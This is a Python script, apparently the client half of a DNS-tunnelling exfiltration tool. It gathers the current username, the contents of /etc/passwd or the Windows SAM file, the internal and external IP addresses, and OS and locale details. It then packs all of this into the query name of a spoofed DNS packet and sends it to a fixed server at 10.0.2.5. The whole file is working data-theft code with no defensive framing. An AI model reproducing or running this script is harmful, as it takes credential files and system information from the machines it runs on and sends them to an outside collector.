import locale
import sys
import os
import getpass
from requests import get
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP



DNS_port = 53
DNS_server_ip = "10.0.2.5"



def client_connection():
    print("Hello I am the client")
    query_packet()
    print("client end")
    return


def data_to_send():
    username = getpass.getuser()

    # for windows
    if os.name == 'nt':
        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
        password_file = fp.read()
        password_file.decode("utf-8", "ignore")

    # for linux
    else:
        fp = open("/etc/passwd", "r")
        password_file = fp.read()

    fp.close()

    #----get ip internal/external----#
    ip = get("https://api.ipify.org").text
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_internal = s.getsockname()[0]
    s.close()
    #--------------------------------#

    passwords = str(password_file)

    # Get the OS information using os.uname()
    os_info = os.uname()
    # Extract relevant information
    os_name = os_info.sysname
    os_version = os_info.version
    os_release = os_info.release
    os_data = os_name + "" + os_version + "" + os_release

    data_to_send = "username: " + username + "\n" \
                   + "\n" + "external ip address: " + ip \
                   + "\n" + "internal ip address: " + ip_internal \
                   + "\n" + "Password file data:\n\n" + passwords \
                   + "\n" + "Languages: " + str(locale.locale_alias) \
                   + "\n" + "operating system: " + os_data

    return data_to_send

def query_packet():
    #-----------------IP Layer---------------#
    ip = IP()
    ip.src = "1.2.3.4"
    ip.dst = '10.0.2.5'
    #----------------------------------------#

    #-----------------Transport Layer---------------#
    udp = UDP()
    udp.dport = 53
    #----------------------------------------------

    #-----------------Application Layer---------------#
    dns = DNS()
    dns.id = random.randint(1, pow(2, 16)-1)
    dns.qr = 0
    dns.opcode = 0
    dns.rd = 1
    dns.qd = DNSQR()

    dns.qd.qname = data_to_send()
    # ------------------------------------------------#

    #-----------------The Complete Packet---------------#
    dns_request = ip / udp / dns
    #---------------------------------------------------#
    send(dns_request)


if __name__ == "__main__":
    client_connection()